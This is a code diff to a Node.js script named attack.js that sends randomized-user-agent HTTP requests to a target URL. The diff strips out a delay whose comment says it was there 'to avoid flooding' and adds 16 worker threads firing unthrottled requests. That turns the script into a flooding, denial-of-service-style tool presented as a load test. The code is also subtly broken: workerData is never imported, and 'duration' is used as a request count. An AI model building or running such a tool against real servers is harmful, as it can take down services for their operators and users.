@@ -1,6 +1,8 @@
 const http = require('http');
-const faker = require('faker');
-const uuid = require('uuid');
+const { Worker, isMainThread, parentPort } = require('worker_threads');
+const faker = require('faker'); // For random UA and device ID generation
+const uuid = require('uuid'); // For generating unique device IDs
+const os = require('os');
 
 // Generate Random Mobile User-Agent (UA)
 function generateRandomUA() {
@@ -38,14 +40,8 @@ function sendRequest(targetUrl) {
   };
 
   const req = http.request(options, (res) => {
-    let data = '';
-    res.on('data', (chunk) => {
-      data += chunk;
-    });
-
-    res.on('end', () => {
-      console.log(`Response from ${targetUrl.hostname}: ${res.statusCode}`);
-    });
+    res.on('data', () => {}); // We discard the data since we're focused on the requests
+    res.on('end', () => {}); // Do nothing after the request ends
   });
 
   req.on('error', (err) => {
@@ -55,32 +51,41 @@ function sendRequest(targetUrl) {
   req.end();
 }
 
-// Simulate Multiple Requests with Randomized User-Agent and Device ID
-function simulateLoad(targetUrl, duration) {
-  const endTime = Date.now() + duration * 1000; // Duration in milliseconds
-  let requestsSent = 0;
-
-  const interval = setInterval(() => {
-    if (Date.now() >= endTime) {
-      clearInterval(interval);
-      console.log(`Test complete. ${requestsSent} requests sent.`);
-      return;
-    }
-    
+// Worker function to send requests in parallel
+function workerFunction(targetUrl, requests) {
+  for (let i = 0; i < requests; i++) {
     sendRequest(targetUrl);
-    requestsSent++;
-  }, 100); // Delay 100ms between requests to avoid flooding
+  }
 }
 
-// Parse command-line arguments
-const args = process.argv.slice(2);
-if (args.length < 2) {
-  console.log("Usage: node attack.js <target_url> <duration_in_seconds>");
-  process.exit(1);
+// Main function for managing threads
+function startLoadTest(targetUrl, duration) {
+  const numThreads = 16; // Number of threads for load generation
+  const requestsPerThread = Math.floor(duration / numThreads); // Divide requests equally across threads
+
+  // Create workers
+  for (let i = 0; i < numThreads; i++) {
+    new Worker(__filename, {
+      workerData: { targetUrl: targetUrl, requests: requestsPerThread },
+    });
+  }
 }
 
-const targetUrl = new URL(args[0]); // Target URL (http://example.com)
-const duration = parseInt(args[1], 10); // Duration in seconds
+// If the current thread is the main thread, handle arguments and run the load test
+if (isMainThread) {
+  const args = process.argv.slice(2);
+  const targetUrl = new URL(args[0]); // First argument is the target URL
+  const duration = parseInt(args[1], 10); // Second argument is the duration (in ms)
 
-// Start the load test
-simulateLoad(targetUrl, duration);
+  if (!targetUrl || !duration) {
+    console.error('Usage: node attack.js <target_url> <duration_in_ms>');
+    process.exit(1);
+  }
+
+  // Start the load test
+  startLoadTest(targetUrl, duration);
+} else {
+  // Worker thread logic
+  const { targetUrl, requests } = workerData;
+  workerFunction(targetUrl, requests);
+}
